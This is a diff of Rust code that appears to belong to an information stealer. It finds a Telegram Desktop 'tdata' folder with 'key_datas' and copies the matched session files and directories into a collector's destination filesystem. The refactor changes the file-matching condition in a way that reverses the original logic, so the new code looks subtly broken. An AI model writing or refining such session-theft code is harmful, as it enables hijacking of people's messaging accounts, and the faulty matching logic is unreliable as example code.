@@ -1,5 +1,6 @@
 use alloc::borrow::ToOwned;
-use alloc::vec;
+use alloc::fmt::format;
+use alloc::{format, vec};
 use collector::{Collector, Software};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
@@ -37,7 +38,7 @@ where
     C: Collector,
     F: FileSystem,
 {
-    if !StorageFileSystem.is_exists(&(tdata / s!("key_datas"))) {
+    if !StorageFileSystem.is_exists(tdata / s!("key_datas")) {
         return;
     }
 
@@ -57,7 +58,10 @@ where
 
     for file in &files {
         for dir in &dirs {
-            if dir.name().unwrap().to_owned() + "s" == file.name().unwrap() {
+            if let Some(dir_name) = dir.name()
+                && let Some(file_name) = file.name()
+                && dir_name == format!("s{file_name}")
+            {
                 contents.push(file);
                 contents.push(dir);
             }
@@ -70,9 +74,9 @@ where
 
     for path in contents {
         if StorageFileSystem.is_file(path) {
-            let _ = copy_file(&StorageFileSystem, path, dst_filesystem, dst, true);
+            let _ = copy_file(StorageFileSystem, path, dst_filesystem, dst, true);
         } else if StorageFileSystem.is_dir(path) {
-            let _ = copy_folder(&StorageFileSystem, path, dst_filesystem, dst);
+            let _ = copy_folder(StorageFileSystem, path, dst_filesystem, dst);
         }
     }
 
